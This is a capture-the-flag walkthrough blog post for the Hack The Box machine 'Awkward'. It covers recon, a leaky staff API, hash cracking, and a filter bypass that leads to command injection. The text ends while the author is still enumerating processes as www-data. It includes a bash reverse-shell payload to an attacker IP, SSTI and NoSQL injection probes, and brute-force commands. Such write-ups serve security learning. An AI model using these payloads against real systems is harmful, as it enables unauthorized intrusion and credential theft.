---
layout: post
title: Hack The Box Walkthrough - Awkward
date: 2023-01-14
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/01/HTB/Awkward
img: 2023/01/Awkward/Awkward.png
---

This was a difficult box for me. I had to exploit a web application to get Remote Code Execution, find the user's password in an notes file, then exploit the same application a second time to get root.

* Room: Awkward
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/Awkward](https://app.hackthebox.com/machines/Awkward)
* Author: [coopertim13](https://app.hackthebox.com/users/55851)

## Enumeration

I started by enumerating open ports with rustscan.

```bash
$ rustscan -a target -- -A  | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.185:22
Open 10.10.11.185:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-07 19:26 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Initiating Ping Scan at 19:26
Scanning 10.10.11.185 [2 ports]
Completed Ping Scan at 19:26, 0.05s elapsed (1 total hosts)
Initiating Connect Scan at 19:26
Scanning target (10.10.11.185) [2 ports]
Discovered open port 80/tcp on 10.10.11.185
Discovered open port 22/tcp on 10.10.11.185
Completed Connect Scan at 19:26, 0.02s elapsed (2 total ports)
Initiating Service scan at 19:26
Scanning 2 services on target (10.10.11.185)
Completed Service scan at 19:26, 6.08s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.185.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.99s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.10s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Nmap scan report for target (10.10.11.185)
Host is up, received syn-ack (0.042s latency).
Scanned at 2023-01-07 19:26:23 EST for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 7254afbaf6e2835941b7cd611c2f418b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCMaN1wQtPg5uk2w3xD0d0ND6JQgzw40PoqCSBDGB7Q0/f5lQSGU2eSTw4uCdL99hdM/+Uv84ffp2tNkCXyV8l8=
|   256 59365bba3c7821e326b37d23605aec38 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFsq9sSC1uhq5CBWylh+yiC7jz4tuegMj/4FVTp6bzZy
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.67 seconds
```

There were two open ports, 22 (SSH) and 80 (HTTP).

The website was redirecting to `http://hat-valley.htb/`, I added the domain to my hosts file. I scanned the site with Feroxbuster. But it did not find anything useful.

![Main Site](/assets/images/2023/01/Awkward/HatValleySite.png "Main Site")

I used wfuzz to look for subdomains. 

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -t30 --hw 13 -H "Host:FUZZ.hat-valley.htb" "http://hat-valley.htb/"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 /home/ehogue/.local/lib/python3.10/site-packages/requests/__init__.py:87: RequestsDependencyWarning:urllib3 (1.26.5) or chardet (5.1.0) doesn't match a supported version!
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://hat-valley.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000501986:   401        7 L      12 W       188 Ch      "store"

Total time: 0
Processed Requests: 648201
Filtered Requests: 648200
Requests/sec.: 0
```

There was one subdomain: `store.hat-valley.htb`. I added it to my hosts file and scanned the site with Feroxbuster. It did not find anything. I tried looking at the site, but it required authentication. 

## Main Site

I looked around the site. There were a few employee profiles. I noted their name in case I could use them as usernames later. There was a form on the bottom, but it did not do anything when I posted it.

I looked at the JavaScript code, it had the [Source Maps](https://developer.chrome.com/blog/sourcemaps/). I opened the Firefox Developers tools to look at it. 

![Source Code](/assets/images/2023/01/Awkward/SourceCode.png "Source Code")

I opened the router's code and saw that the site was exposing four routes.

```js
const routes = [
  {
    path: "/",
    name: "base",
    component: Base,
  },
  {
    path: "/hr",
    name: "hr",
    component: HR,
  },
  {
    path: "/dashboard",
    name: "dashboard",
    component: Dashboard,
    meta: {
      requiresAuth: true
    }
  },
  {
    path: "/leave",
    name: "leave",
    component: Leave,
    meta: {
      requiresAuth: true
    }
  }
];

const router = createRouter({
  history: createWebHistory(),
  routes,
});

router.beforeEach((to, from, next) => {
  if((to.name == 'leave' || to.name == 'dashboard') && VueCookieNext.getCookie('token') == 'guest') { //if user not logged in, redirect to login
    next({ name: 'hr' })
  }
  else if(to.name == 'hr' && VueCookieNext.getCookie('token') != 'guest') { //if user logged in, skip past login to dashboard
    next({ name: 'dashboard' })
  }
  else {
    next()
  }
})

export default router;
```

The `dashboard` and `leave` endpoints needed a `token` cookie. If it was set to anything other than 'guest', the page would be rendered. I changed my cookie to 'admin' and loaded the dashboard page.

![Dashboard](/assets/images/2023/01/Awkward/Dashboard.png "Dashboard")

The page loaded. Same with the page to send leave requests.

![Leave Requests](/assets/images/2023/01/Awkward/LeaveRequest.png "Leave Requests")

But posting a request failed. 

```js
JsonWebTokenError: jwt malformed<br> &nbsp; &nbsp;at Object.module.exports [as verify] (/var/www/hat-valley.htb/node_modules/jsonwebtoken/verify.js:63:17)<br> &nbsp; &nbsp;at /var/www/hat-valley.htb/server/server.js:62:30<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15<br> &nbsp; &nbsp;at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)<br> &nbsp; &nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:280:10)<br> &nbsp; &nbsp;at cookieParser (/var/www/hat-valley.htb/node_modules/cookie-parser/index.js:71:5)
```

My cookie was invalid. It was expecting a JWT. I tried forging one with the `none` algorithm. Especially since I know about a [recent vulnerability](https://security.snyk.io/vuln/SNYK-JS-JSONWEBTOKEN-3180026) in the library it used. But that failed.

The login attempts were posted to `/api/login`.

```http
POST /api/login HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 39
Origin: http://hat-valley.htb
Connection: close
Referer: http://hat-valley.htb/hr
Cookie: token=guest

{"username":"admin","password":"admin"}
```

I tried sending some SQL injections without any results.

I tried NoSQL injection in the username.

```http
POST /api/login HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 40
Origin: http://hat-valley.htb
Connection: close
Referer: http://hat-valley.htb/hr
Cookie: token=guest

{"username":{
"$ne":""},"password":"'"}
```

```http
HTTP/1.1 401 Unauthorized
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 13 Jan 2023 14:47:05 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 30
Connection: close
x-powered-by: Express
access-control-allow-origin: *
etag: W/"1e-rLNS954LHEEL+kNUFi+s5vEu3/o"

Incorrect username or password
```

It didn't do anything. I tried in the password.

```http
POST /api/login HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 49
Origin: http://hat-valley.htb
Connection: close
Referer: http://hat-valley.htb/hr
Cookie: token=guest

{"username":{
"$ne":""},"password":{
"$ne":""}}
```

It gave me an error. But it did not appear to be used in a database query. It was probably trying to hash the password to validate it. But that hinted that the types of the data were not checked.

```http
HTTP/1.1 500 Internal Server Error
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 13 Jan 2023 14:47:21 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1247
Connection: close
x-powered-by: Express
access-control-allow-origin: *
content-security-policy: default-src 'none'
x-content-type-options: nosniff

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>TypeError [ERR_INVALID_ARG_TYPE]: The first argument must be of type string or an instance of Buffer, ArrayBuffer, or Array or an Array-like Object. Received an instance of Object<br> &nbsp; &nbsp;at Function.from (buffer.js:330:9)<br> &nbsp; &nbsp;at new Buffer (buffer.js:286:17)<br> &nbsp; &nbsp;at module.exports (/var/www/hat-valley.htb/node_modules/sha256/lib/nodecrypto.js:14:12)<br> &nbsp; &nbsp;at /var/www/hat-valley.htb/server/server.js:30:76<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15<br> &nbsp; &nbsp;at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)</pre>
</body>
</html>
```

### APIs

I looked at the various API calls the application was making. I looked in the services folder in the application code. 

* /api/all-leave - Get the leave requests
* /api/submit-leave - Create a leave request
* /api/login - Login to the application
* /api/staff-details - Get information about the staff
* /api/store-status - Verify if the store is online

Most the calls were failing because of my bad JWT. I tried forging one again, but I failed. 

### Server-Side Request Forgery (SSRF)

The store status API calls were not failing with my token. It was always returning a 200 with no content. I removed the token and got the same result. 

The API was taking a URL parameter. So I immediately thought I could get SSRF. I tried changing the URL to see what would happen. I sent 'http://hat-valley.htb', this time the response contained the main site source code. I tried requesting other pages, but got blank responses. Requesting a JavaScript file worked. It looked like anything that required authentication failed. But still responded with a 200.

I tried setting up a web server on my machine. I could use the status call to request it. I tried using redirects. It worked, but I got the same results as requesting the pages directly in the URL parameter.

I also tried sending a page with multiple Server-Side Templating (SSTI) payloads taken from [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#detect). None of them worked.

{% raw %}
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
engine.render("Hello {{"+greeting+"}}", data)
```
{% endraw %}

I thought that maybe there were other ports accessible only on the server. I scanned the ports again, this time with nmap, to see if it would detect any filtered port. It did not. 

### Unauthenticated API Call

I was going to write a small script to try requesting all the ports with the SSRF. But I decided to first add more notes on the different API calls. The fact that the status call was working without the token made me think that they were not all using the same code. And maybe some calls were not correctly protected. 

I went through all the API endpoints. I tried with my 'admin' token, with a generated unsigned token, and without any token.

When I got to the staff details endpoint, I got a nice surprise when I requested it without a token.

```http
GET /api/staff-details HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://hat-valley.htb/dashboard
```

It worked without the JWT. 

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 15 Jan 2023 12:10:29 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 775
Connection: close
x-powered-by: Express
access-control-allow-origin: *
etag: W/"307-yT9RDkJOX+lsRRlC/J2nEu9d6Is"

[
  {
    "user_id": 1,
    "username": "christine.wool",
    "password": "6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649",
    "fullname": "Christine Wool",
    "role": "Founder, CEO",
    "phone": "0415202922"
  },
  {
    "user_id": 2,
    "username": "christopher.jones",
    "password": "e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1",
    "fullname": "Christopher Jones",
    "role": "Salesperson",
    "phone": "0456980001"
  },
  {
    "user_id": 3,
    "username": "jackson.lightheart",
    "password": "b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436",
    "fullname": "Jackson Lightheart",
    "role": "Salesperson",
    "phone": "0419444111"
  },
  {
    "user_id": 4,
    "username": "bean.hill",
    "password": "37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f",
    "fullname": "Bean Hill",
    "role": "System Administrator",
    "phone": "0432339177"
  }
]
```

Even better, it returned the password hashes as part of the payload. I saved them to a file and tried cracking them with hashcat.

```bash
$ hashcat -a0 -m1400 --username hash.txt /usr/share/seclists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2869/5803 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 4 digests; 4 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:REDACTED
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: hash.txt
Time.Started.....: Fri Jan 13 17:55:39 2023 (4 secs)
Time.Estimated...: Fri Jan 13 17:55:43 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4072.8 kH/s (0.35ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/4 (25.00%) Digests (total), 1/4 (25.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[21217365786d652121] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 50%

Started: Fri Jan 13 17:55:25 2023
Stopped: Fri Jan 13 17:55:45 2023
```

I had the password for 'christopher.jones'. I tried the credentials in SSH, but they failed. I tried them on the sites. It worked on the main site but failed in the store.

I had some potential usernames. So I launched Hydra to try to brute force the store login. It went through all rockyou without any success.

## Remote Code Execution

Once connected to the site, I tried the different API calls again. The status call worked the same way. I kept in mind that I still needed to use it to scan ports. But I kept exploring the other calls first.

The call to get the leave requests were now returning two rows.

```
bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
```

The call to submit new leave requests was sending the three fields in JSON. I tried using it to execute code on the server.

```bash
POST /api/submit-leave HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 67
Origin: http://hat-valley.htb
Connection: close
Referer: http://hat-valley.htb/leave
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjczNjUwNzgzfQ.BmsL4d_9cvKe3dJKhW5XVio841FaYrvkfuO3iYlZKbs

{"reason":"`id` $(id); id","start":"13/01/2023","end":"13/01/2023"}
```

But some characters were rejected. 

```bash
HTTP/1.1 500 Internal Server Error
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 13 Jan 2023 23:02:10 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 23
Connection: close
x-powered-by: Express
access-control-allow-origin: *
etag: W/"17-OzWJr/zG6kKdbqASHxkKlgUotLk"

Bad character detected.
```

I did some experimentation and found that those characters were rejected: {% raw %} ! # $ ? & \* ( ) < \> [ ] { } ; ` \| {% endraw %}.

But those were not:

![Valid Characters](/assets/images/2023/01/Awkward/ValidChars.png "Valid Characters")

Sending a comma in my payload was very interesting. 

```json
{
  "reason":"re,ason",
  "start":"13/01/2023",
  "end":"13/01/2023"
}
```

![Comma In Payload](/assets/images/2023/01/Awkward/CommaInPayload.png "Comma In Payload")

It looked like the comma was used as a separator. With the name of the box hinting at the use of `awk`, I pushed more in that direction. There was a [vulnerability in awk](https://bugs.busybox.net/show_bug.cgi?id=14781) released a few months before the box. But I could not exploit it.

I kept experimenting with the payload. And when I tried sending an object as the reason instead of a string, it got interesting.

```json
{
  "reason":{},
  "start":"13/01/2023",
  "end":"13/01/2023"
}
```

The response contained an error. 

```js
TypeError: reason.includes is not a function<br> &nbsp; &nbsp;at /var/www/hat-valley.htb/server/server.js:79:47<br> &nbsp; &nbsp;at Array.some (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at /var/www/hat-valley.htb/server/server.js:79:27<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15<br> &nbsp; &nbsp;at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)<br> &nbsp; &nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:280:10)
```

The code was calling `includes` on the passed in reason. It was probably trying to look for the forbidden characters. I tried with an array. 

```json
{
  "reason":[],
  "start":"13/01/2023",
  "end":"13/01/2023"
}
```

This worked. And even better, the array allowed me to bypass the validation.

```json
{
  "reason":[
    "reason$"
  ],
  "start":"13/01/2023",
  "end":"13/01/2023"
}
```

I tried using this to execute code and get a reverse shell.

```json
{
  "reason":[
    "`bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'`"
  ],
  "start":"13/01/2023",
  "end":"13/01/2023"
  }
```

I got a hit on my netcat listener. And I was on the server.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.185] 51432
bash: cannot set terminal process group (1969): Inappropriate ioctl for device
bash: no job control in this shell

www-data@awkward:~/hat-valley.htb$ whoami
whoami
www-data
```

## Lateral Movement 

I looked around the server. I could not run `sudo` as www-data and I did not find any `suid` binary. 

The server.js code of the main application contained some credentials.

```js
const connection = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'REDACTED',
  database: 'hatvalley',
  stringifyObjects: true
})
const port = 3002

const TOKEN_SECRET = "REDACTED"
```

I connected to the database, but it only contained the username and password I already got through the API.

The file `/var/www/private/leave_requests.csv` contained the leave requests from everyone.

```bash
www-data@awkward:~/hat-valley.htb$ cat ../private/leave_requests.csv
Leave Request Database,,,,
,,,,
HR System Username,Reason,Start Date,End Date,Approved
bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
christine.wool,Need a break from Jackson,14/03/2022,21/03/2022,Yes
jackson.lightheart,Great uncle's goldfish funeral + ceremony,10/05/2022,10/06/2022,No
jackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,No
christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
christopher.jones,,13/01/2023,14/01/2023,Pending
```

There were two home folders. One for christine that I could not read. And one for bean that had some readable files and folders.

```bash
www-data@awkward:~/store$ ls -la /home/bean/
total 84
drwxr-xr-x 17 bean bean 4096 Oct  6 01:35 .
drwxr-xr-x  4 root root 4096 Oct  5 02:46 ..
lrwxrwxrwx  1 bean bean    9 Sep 15 21:40 .bash_history -> /dev/null
-rw-r--r--  1 bean bean  220 Sep 15 21:34 .bash_logout
-rw-r--r--  1 bean bean 3847 Sep 15 21:45 .bashrc
drwx------  9 bean bean 4096 Sep 22 14:30 .cache
drwx------ 13 bean bean 4096 Oct  6 01:35 .config
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Desktop
drwxr-xr-x  3 bean bean 4096 Sep 15 21:46 Documents
drwxr-xr-x  2 bean bean 4096 Sep 15 23:03 Downloads
drwx------  2 bean bean 4096 Sep 22 14:24 .gnupg
drwx------  3 bean bean 4096 Sep 15 21:35 .local
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Music
drwxrwxr-x  4 bean bean 4096 Oct  6 01:35 .npm
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Pictures
-rw-r--r--  1 bean bean  807 Sep 15 21:34 .profile
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Public
drwx------  4 bean bean 4096 Sep 15 21:55 snap
drwx------  2 bean bean 4096 Sep 15 21:36 .ssh
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Templates
-rw-r-----  1 root bean   33 Jan 14 23:22 user.txt
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Videos

www-data@awkward:~/store$ ls -la /home/bean/Desktop/
total 8
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 .
drwxr-xr-x 17 bean bean 4096 Oct  6 01:35 ..

www-data@awkward:~/store$ ls -la /home/bean/Documents/
total 16
drwxr-xr-x  3 bean bean 4096 Sep 15 21:46 .
drwxr-xr-x 17 bean bean 4096 Oct  6 01:35 ..
drwxrwxr-x  2 bean bean 4096 Sep 15 21:46 backup
-rwxrwxr-x  1 bean bean  369 Sep 15 21:45 backup_home.sh

www-data@awkward:~/store$ ls -la /home/bean/Documents/backup/
total 40
drwxrwxr-x 2 bean bean  4096 Sep 15 21:46 .
drwxr-xr-x 3 bean bean  4096 Sep 15 21:46 ..
-rw-rw-r-- 1 bean bean 31715 Sep 15 21:46 bean_backup_final.tar.gz
```

The backup file was interesting. There were some files and folders I could not read. By extracting it, I thought I might be able to read bean's SSH keys. 

```bash
www-data@awkward:~$ mkdir /tmp/test/

www-data@awkward:~$ cd /tmp/test/

www-data@awkward:/tmp/test$ cp /home/bean/Documents/backup/bean_backup_final.tar.gz .

www-data@awkward:/tmp/test$ gunzip bean_backup_final.tar.gz

www-data@awkward:/tmp/test$ ls
bean_backup_final.tar

www-data@awkward:/tmp/test$ tar -xf bean_backup_final.tar

www-data@awkward:/tmp/test$ ls
bean_backup_final.tar  bean_backup.tar.gz  time.txt

www-data@awkward:/tmp/test$ cat time.txt
Thu 15 Sep 2022 21:46:25 AEST

www-data@awkward:/tmp/test$ gunzip bean_backup.tar.gz

www-data@awkward:/tmp/test$ tar -xf bean_backup.tar

www-data@awkward:/tmp/test$ ls
bean_backup_final.tar  bean_backup.tar  Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  time.txt  Videos

ww-data@awkward:/tmp/test$ ls -la .ssh/
total 8
drwx------  2 www-data www-data 4096 Sep 15 21:36 .
drwxr-x--- 15 www-data www-data 4096 Sep 15 21:45 ..

```

Sadly, there were no SSH keys in the backup. I looked at what it contained. I found the `keyrings` file in `.local/share/keyrings/`. I used John to crack it, the password was not in rockyou.

I looked around the backup but did not find anything else at first. So I went back to looking in the server. The store site requires basic authentication. And that was not in the code. So I looked at the configuration of nginx. 

```bash
www-data@awkward:/home/bean$ cat /etc/nginx/sites-enabled/store.conf
server {
    listen       80;
    server_name  store.hat-valley.htb;
    root /var/www/store;

    location / {
        index index.php index.html index.htm;
    }
    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
    #
    location ~ /cart/.*\.php$ {
        return 403;
    }
    location ~ /product-details/.*\.php$ {
        return 403;
    }
    location ~ \.php$ {
        auth_basic "Restricted";
        auth_basic_user_file /etc/nginx/conf.d/.htpasswd;
        fastcgi_pass   unix:/var/run/php/php8.1-fpm.sock;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME  $realpath_root$fastcgi_script_name;
        include        fastcgi_params;
    }
    # deny access to .htaccess files, if Apache's document root
    # concurs with nginx's one
    #
    #location ~ /\.ht {
    #    deny  all;
    #}
}

www-data@awkward:/home/bean$ cat /etc/nginx/conf.d/.htpasswd
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
```

The credentials to access the store were in a .htpasswd file. I had the username, but hashcat failed to break the password hash. I tried login in with all the passwords I had found so far, but still no luck.

I downloaded [pspy](https://github.com/DominicBreuker/pspy) on the server to look at running processes. 

```bash
2023/01/15 04:00:01 CMD: UID=0    PID=32317  | /usr/sbin/CRON -f -P
2023/01/15 04:00:01 CMD: UID=0    PID=32335  | /usr/sbin/postdrop -r
2023/01/15 04:00:01 CMD: UID=0    PID=32334  | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root
2023/01/15 04:00:01 CMD: UID=0    PID=32328  | mail -s Leave Request: bean.hill christine
2023/01/15 04:00:01 CMD: UID=0    PID=32336  | /usr/sbin/sendmail -oi -f root@awkward -t
2023/01/15 04:00:01 CMD: UID=0    PID=32337  | /usr/sbin/sendmail -oi -f root@awkward -t
2023/01/15 04:00:01 CMD: UID=0    PID=32338  | cleanup -z -t unix -u -c
2023/01/15 04:00:01 CMD: UID=0    PID=32339  | trivial-rewrite -n rewrite -t unix -u -c
2023/01/15 04:00:01 CMD: UID=0    PID=32340  | local -t unix
2023/01/15 04:00:01 CMD: UID=???  PID=32344  | ???
2023/01/15 04:00:01 CMD: UID=0    PID=32342  |
2023/01/15 04:00:01 CMD: UID=0    PID=32346  | /bin/bash /root/scripts/notify.sh
2023/01/15 04:00:01 CMD: UID=0    PID=32347  | /usr/lib/postfix/sbin/master -w
2023/01/15 04:00:01 CMD: UID=0    PID=32348  | /usr/sbin/sendmail -oi -f root@awkward -t
2023/01/15 04:00:01 CMD: UID=0    PID=32349  | /usr/sbin/postdrop -r
```

